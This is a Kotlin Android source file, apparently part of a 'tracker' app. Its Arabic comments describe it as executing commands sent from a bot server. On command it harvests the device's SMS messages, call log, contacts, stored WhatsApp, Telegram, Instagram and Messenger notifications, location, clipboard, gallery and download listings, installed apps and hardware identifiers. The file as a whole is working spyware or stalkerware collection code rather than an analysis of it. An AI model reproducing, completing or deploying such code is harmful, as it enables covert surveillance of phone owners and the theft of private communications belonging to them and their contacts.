package com.abuzahra.tracker

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.provider.*
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * CommandExecutor - منفذ الأوامر
 * يقوم بتنفيذ الأوامر الواردة من سيرفر البوت وجمع البيانات المطلوبة
 *
 * يدعم الأوامر التالية:
 * - sms: جمع الرسائل النصية
 * - calls: جمع سجل المكالمات
 * - contacts: جمع جهات الاتصال
 * - notifications: جمع الإشعارات المخزنة
 * - location: جمع آخر موقع معروف
 * - info: معلومات الجهاز الأساسية
 * - battery: معلومات البطارية
 * - apps: قائمة التطبيقات المثبتة
 * - whatsapp: بيانات واتساب (الإشعارات المخزنة)
 * - telegram: بيانات تيليجرام (الإشعارات المخزنة)
 * - instagram: بيانات انستغرام (الإشعارات المخزنة)
 * - gallery: قائمة صور المعرض
 * - files: قائمة الملفات المخزنة
 * - clipboard: محتوى الحافظة (يحتاج إمكانية وصول)
 */
object CommandExecutor {

    private const val TAG = "CommandExecutor"
    private const val MAX_ITEMS = 50 // الحد الأقصى لعدد العناصر المجمعة لكل أمر

    /**
     * تنفيذ أمر محدد وجمع البيانات
     *
     * @param context سياق التطبيق
     * @param command الأمر المراد تنفيذه
     * @return البيانات المجمعة (قائمة خرائط أو خريطة واحدة)
     */
    suspend fun execute(context: Context, command: String): Any {
        Log.d(TAG, "تنفيذ الأمر: $command")

        return try {
            val result = when (command) {
                "sms" -> collectSMS(context)
                "calls" -> collectCalls(context)
                "contacts" -> collectContacts(context)
                "notifications" -> collectNotifications(context)
                "location" -> collectLocation(context)
                "info" -> collectDeviceInfo(context)
                "battery" -> collectBatteryInfo(context)
                "apps" -> collectInstalledApps(context)
                "whatsapp" -> collectAppNotifications(context, "whatsapp")
                "telegram" -> collectAppNotifications(context, "telegram")
                "instagram" -> collectAppNotifications(context, "instagram")
                "messenger" -> collectAppNotifications(context, "messenger")
                "gallery" -> collectGalleryImages(context)
                "files" -> collectFiles(context)
                "clipboard" -> collectClipboard(context)
                else -> mapOf(
                    "error" to "أمر غير معروف: $command",
                    "command" to command,
                    "timestamp" to System.currentTimeMillis()
                )
            }

            Log.d(TAG, "تم جمع بيانات [$command]: ${
                when (result) {
                    is List<*> -> "${result.size} عنصر"
                    is Map<*, *> -> "خريطة بيانات"
                    else -> result.toString().take(100)
                }
            }")

            result
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في تنفيذ الأمر [$command]: ${e.message}", e)
            mapOf(
                "error" to "خطأ في تنفيذ الأمر: ${e.message}",
                "command" to command,
                "timestamp" to System.currentTimeMillis()
            )
        }
    }

    // ==================== ==================== ====================
    //              جمع الرسائل النصية (SMS)
    // ==================== ==================== ====================

    @SuppressLint("Range")
    private fun collectSMS(context: Context): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()

        if (!hasPermission(context, Manifest.permission.READ_SMS)) {
            return listOf(mapOf("error" to "لا يوجد إذن لقراءة الرسائل"))
        }

        try {
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                "${Telephony.Sms.DATE} DESC"
            )

            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < MAX_ITEMS) {
                    val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "غير معروف"
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    val read = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.READ)) == 1

                    val typeStr = when (type) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "وارد"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "مرسل"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "مسودة"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "صادر"
                        Telephony.Sms.MESSAGE_TYPE_FAILED -> "فاشل"
                        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "في الانتظار"
                        else -> "نوع: $type"
                    }

                    results.add(mapOf(
                        "phone" to address,
                        "body" to body,
                        "timestamp" to date,
                        "date_readable" to formatDate(date),
                        "type" to typeStr,
                        "is_read" to read,
                        "collected_at" to System.currentTimeMillis()
                    ))
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع الرسائل: ${e.message}", e)
            results.add(mapOf("error" to "خطأ: ${e.message}"))
        }

        return results
    }

    // ==================== ==================== ====================
    //              جمع سجل المكالمات (Call Log)
    // ==================== ==================== ====================

    @SuppressLint("Range")
    private fun collectCalls(context: Context): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()

        if (!hasPermission(context, Manifest.permission.READ_CALL_LOG)) {
            return listOf(mapOf("error" to "لا يوجد إذن لقراءة سجل المكالمات"))
        }

        try {
            val cursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < MAX_ITEMS) {
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "غير معروف"
                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val name = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: ""

                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "وارد"
                        CallLog.Calls.OUTGOING_TYPE -> "صادر"
                        CallLog.Calls.MISSED_TYPE -> "فائت"
                        CallLog.Calls.REJECTED_TYPE -> "مرفوض"
                        CallLog.Calls.BLOCKED_TYPE -> "محظور"
                        else -> "نوع: $type"
                    }

                    val durationStr = if (duration > 0) {
                        val mins = duration / 60
                        val secs = duration % 60
                        "${mins}:${String.format("%02d", secs)}"
                    } else "لم يُجب"

                    results.add(mapOf(
                        "phone" to number,
                        "name" to name,
                        "timestamp" to date,
                        "date_readable" to formatDate(date),
                        "type" to typeStr,
                        "duration_seconds" to duration,
                        "duration_formatted" to durationStr,
                        "collected_at" to System.currentTimeMillis()
                    ))
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع المكالمات: ${e.message}", e)
            results.add(mapOf("error" to "خطأ: ${e.message}"))
        }

        return results
    }

    // ==================== ==================== ====================
    //              جمع جهات الاتصال (Contacts)
    // ==================== ==================== ====================

    @SuppressLint("Range")
    private fun collectContacts(context: Context): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()

        if (!hasPermission(context, Manifest.permission.READ_CONTACTS)) {
            return listOf(mapOf("error" to "لا يوجد إذن لقراءة جهات الاتصال"))
        }

        try {
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
            )

            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < MAX_ITEMS) {
                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: ""

                    // جمع أرقام الهاتف لجهة الاتصال
                    val phones = mutableListOf<String>()
                    val phoneCursor: Cursor? = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            phones.add(
                                pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: ""
                            )
                        }
                    }

                    // جمع البريد الإلكتروني
                    val emails = mutableListOf<String>()
                    val emailCursor: Cursor? = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    emailCursor?.use { ec ->
                        while (ec.moveToNext()) {
                            emails.add(
                                ec.getString(ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA)) ?: ""
                            )
                        }
                    }

                    results.add(mapOf(
                        "name" to name,
                        "phones" to phones,
                        "emails" to emails,
                        "contact_id" to id,
                        "collected_at" to System.currentTimeMillis()
                    ))
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع جهات الاتصال: ${e.message}", e)
            results.add(mapOf("error" to "خطأ: ${e.message}"))
        }

        return results
    }

    // ==================== ==================== ====================
    //              جمع الإشعارات المخزنة (Notifications)
    // ==================== ==================== ====================

    /**
     * جمع الإشعارات المخزنة محلياً
     * الإشعارات يتم حفظها عند ورودها عبر MyNotificationListener
     */
    private fun collectNotifications(context: Context): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()

        try {
            val notificationFiles = LocalStorageManager.readData(context, "notification")
            val gson = com.google.gson.Gson()
            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type

            notificationFiles.take(MAX_ITEMS).forEach { json ->
                try {
                    val notification = gson.fromJson<Map<String, Any>>(json, type)
                    results.add(notification)
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في تحليل إشعار: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع الإشعارات: ${e.message}", e)
        }

        if (results.isEmpty()) {
            results.add(mapOf(
                "message" to "لا توجد إشعارات مخزنة",
                "collected_at" to System.currentTimeMillis()
            ))
        }

        return results
    }

    /**
     * جمع إشعارات تطبيق محدد (واتساب، تيليجرام، إلخ)
     */
    private fun collectAppNotifications(context: Context, appName: String): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()

        try {
            // قراءة إشعارات التطبيق المحدد من التخزين المحلي
            val appFiles = LocalStorageManager.readData(context, appName)
            val gson = com.google.gson.Gson()
            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type

            appFiles.take(MAX_ITEMS).forEach { json ->
                try {
                    val notification = gson.fromJson<Map<String, Any>>(json, type)
                    results.add(notification)
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في تحليل إشعار $appName: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع إشعارات $appName: ${e.message}", e)
        }

        if (results.isEmpty()) {
            results.add(mapOf(
                "app" to appName,
                "message" to "لا توجد إشعارات مخزنة لـ $appName",
                "collected_at" to System.currentTimeMillis()
            ))
        }

        return results
    }

    // ==================== ==================== ====================
    //              جمع الموقع (Location)
    // ==================== ==================== ====================

    private fun collectLocation(context: Context): Map<String, Any?> {
        return try {
            // قراءة آخر موقع محفوظ
            val locationFiles = LocalStorageManager.readData(context, "location")
            val gson = com.google.gson.Gson()
            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type

            if (locationFiles.isNotEmpty()) {
                val lastLocation = gson.fromJson<Map<String, Any>>(locationFiles.first(), type)
                lastLocation + mapOf("collected_at" to System.currentTimeMillis())
            } else {
                mapOf(
                    "error" to "لا يوجد موقع محفوظ",
                    "timestamp" to System.currentTimeMillis(),
                    "collected_at" to System.currentTimeMillis()
                )
            }
        } catch (e: Exception) {
            mapOf(
                "error" to "خطأ في جمع الموقع: ${e.message}",
                "timestamp" to System.currentTimeMillis()
            )
        }
    }

    // ==================== ==================== ====================
    //              جمع معلومات الجهاز (Device Info)
    // ==================== ==================== ====================

    @SuppressLint("HardwareIds")
    private fun collectDeviceInfo(context: Context): Map<String, Any?> {
        return try {
            mapOf(
                "device_name" to getDeviceName(context),
                "device_model" to Build.MODEL,
                "brand" to Build.BRAND,
                "manufacturer" to Build.MANUFACTURER,
                "os_version" to "Android ${Build.VERSION.RELEASE}",
                "api_level" to Build.VERSION.SDK_INT,
                "build_number" to Build.DISPLAY,
                "device_id" to (SharedPrefsManager.getDeviceId(context) ?: "غير معروف"),
                "serial" to (if (hasPermission(context, Manifest.permission.READ_PHONE_STATE)) {
                    try { Build.getSerial() } catch (e: Exception) { "غير متوفر" }
                } else "غير مصرح"),
                "screen_resolution" to getScreenResolution(context),
                "total_ram" to getTotalMemory(),
                "collected_at" to System.currentTimeMillis()
            )
        } catch (e: Exception) {
            mapOf("error" to "خطأ: ${e.message}", "collected_at" to System.currentTimeMillis())
        }
    }

    // ==================== ==================== ====================
    //              جمع معلومات البطارية (Battery)
    // ==================== ==================== ====================

    private fun collectBatteryInfo(context: Context): Map<String, Any?> {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
            val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))

            val level = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            val isCharging = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING
            val chargeType = when (batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)) {
                BatteryManager.BATTERY_PLUGGED_AC -> "كهرباء"
                BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                BatteryManager.BATTERY_PLUGGED_WIRELESS -> "لاسلكي"
                else -> "غير موصول"
            }
            val temperature = batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0)?.let { it / 10.0 } ?: 0.0
            val voltage = batteryIntent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0)?.let { it / 1000.0 } ?: 0.0
            val health = when (batteryIntent?.getIntExtra(BatteryManager.EXTRA_HEALTH, -1)) {
                BatteryManager.BATTERY_HEALTH_GOOD -> "جيدة"
                BatteryManager.BATTERY_HEALTH_OVERHEAT -> "ساخنة"
                BatteryManager.BATTERY_HEALTH_DEAD -> "ميتة"
                BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "جهد عالي"
                BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "عطل غير محدد"
                else -> "غير معروف"
            }

            mapOf(
                "level" to level,
                "is_charging" to isCharging,
                "charge_type" to chargeType,
                "temperature_celsius" to temperature,
                "voltage_volts" to voltage,
                "health" to health,
                "collected_at" to System.currentTimeMillis()
            )
        } catch (e: Exception) {
            mapOf("error" to "خطأ: ${e.message}", "collected_at" to System.currentTimeMillis())
        }
    }

    // ==================== ==================== ====================
    //              جمع التطبيقات المثبتة (Installed Apps)
    // ==================== ==================== ====================

    @Suppress("DEPRECATION")
    private fun collectInstalledApps(context: Context): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()

        try {
            val pm = context.packageManager
            val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(0))
            } else {
                pm.getInstalledPackages(0)
            }

            packages?.forEach { pkgInfo ->
                try {
                    val appInfo = pkgInfo.applicationInfo!!
                    val isSystemApp = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0
                    val appName = appInfo.loadLabel(pm).toString()
                    val packageName = pkgInfo.packageName

                    // تجاهل التطبيقات النظامية لتقليل حجم البيانات
                    if (!isSystemApp) {
                        results.add(mapOf(
                            "name" to appName,
                            "package" to packageName,
                            "version" to getVersionName(pkgInfo),
                            "is_system" to false,
                            "installed_at" to (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                pkgInfo.firstInstallTime
                            } else {
                                @Suppress("DEPRECATION")
                                pkgInfo.firstInstallTime
                            })
                        ))
                    }
                } catch (e: Exception) {
                    // تجاهل التطبيقات التي لا يمكن قراءتها
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع التطبيقات: ${e.message}", e)
            results.add(mapOf("error" to "خطأ: ${e.message}"))
        }

        return results
    }

    // ==================== ==================== ====================
    //              جمع صور المعرض (Gallery)
    // ==================== ==================== ====================

    @SuppressLint("Range")
    private fun collectGalleryImages(context: Context): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()

        try {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.MIME_TYPE
            )

            val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"

            context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < MAX_ITEMS) {
                    val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                    val name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                    val date = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
                    val size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE))
                    val mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE))

                    results.add(mapOf(
                        "name" to name,
                        "date_taken" to date,
                        "date_readable" to formatDate(date),
                        "size_bytes" to size,
                        "size_formatted" to formatFileSize(size),
                        "mime_type" to mimeType,
                        "collected_at" to System.currentTimeMillis()
                    ))
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع صور المعرض: ${e.message}", e)
            results.add(mapOf("error" to "خطأ: ${e.message}"))
        }

        return results
    }

    // ==================== ==================== ====================
    //              جمع الملفات المخزنة (Files)
    // ==================== ==================== ====================

    private fun collectFiles(context: Context): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()

        try {
            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            if (downloadsDir.exists()) {
                downloadsDir.listFiles()
                    ?.filter { it.isFile }
                    ?.sortedByDescending { it.lastModified() }
                    ?.take(MAX_ITEMS)
                    ?.forEach { file ->
                        results.add(mapOf(
                            "name" to file.name,
                            "size_bytes" to file.length(),
                            "size_formatted" to formatFileSize(file.length()),
                            "last_modified" to file.lastModified(),
                            "date_readable" to formatDate(file.lastModified()),
                            "path" to file.absolutePath,
                            "collected_at" to System.currentTimeMillis()
                        ))
                    }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع الملفات: ${e.message}", e)
            results.add(mapOf("error" to "خطأ: ${e.message}"))
        }

        if (results.isEmpty()) {
            results.add(mapOf(
                "message" to "لا توجد ملفات أو لا يمكن الوصول إليها",
                "collected_at" to System.currentTimeMillis()
            ))
        }

        return results
    }

    // ==================== ==================== ====================
    //              جمع محتوى الحافظة (Clipboard)
    // ==================== ==================== ====================

    @Suppress("DEPRECATION")
    private fun collectClipboard(context: Context): Map<String, Any?> {
        return try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
            val clip = clipboard?.primaryClip

            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: ""
                mapOf(
                    "content" to text,
                    "length" to text.length,
                    "collected_at" to System.currentTimeMillis()
                )
            } else {
                mapOf(
                    "message" to "الحافظة فارغة",
                    "collected_at" to System.currentTimeMillis()
                )
            }
        } catch (e: Exception) {
            mapOf(
                "error" to "خطأ في قراءة الحافظة: ${e.message}",
                "collected_at" to System.currentTimeMillis()
            )
        }
    }

    // ==================== ==================== ====================
    //              دوال مساعدة (Helper Functions)
    // ==================== ==================== ====================

    /**
     * التحقق من وجود إذن
     */
    private fun hasPermission(context: Context, permission: String): Boolean {
        return context.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * تنسيق التاريخ ليكون مقروءاً
     */
    private fun formatDate(timestamp: Long): String {
        return try {
            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            sdf.format(Date(timestamp))
        } catch (e: Exception) {
            timestamp.toString()
        }
    }

    /**
     * تنسيق حجم الملف
     */
    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> String.format("%.1f KB", bytes / 1024.0)
            bytes < 1024 * 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024.0))
            else -> String.format("%.1f GB", bytes / (1024.0 * 1024.0 * 1024.0))
        }
    }

    /**
     * الحصول على اسم الجهاز
     */
    private fun getDeviceName(context: Context): String {
        return try {
            android.provider.Settings.Secure.getString(
                context.contentResolver, "bluetooth_name"
            ) ?: Build.DEVICE
        } catch (e: Exception) {
            Build.DEVICE
        }
    }

    /**
     * الحصول على دقة الشاشة
     */
    private fun getScreenResolution(context: Context): String {
        return try {
            val dm = context.resources.displayMetrics
            "${dm.widthPixels}x${dm.heightPixels}"
        } catch (e: Exception) {
            "غير معروف"
        }
    }

    /**
     * الحصول على إجمالي ذاكرة الوصول العشوائي
     */
    private fun getTotalMemory(): String {
        return try {
            val runtime = Runtime.getRuntime()
            val totalMemory = runtime.totalMemory() // بالبايت
            String.format("%.0f MB", totalMemory / (1024.0 * 1024.0))
        } catch (e: Exception) {
            "غير معروف"
        }
    }

    /**
     * الحصول على اسم إصدار التطبيق
     */
    @Suppress("DEPRECATION")
    private fun getVersionName(pkgInfo: PackageInfo): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            pkgInfo.versionName ?: "غير معروف"
        } else {
            pkgInfo.versionName ?: "غير معروف"
        }
    }
}
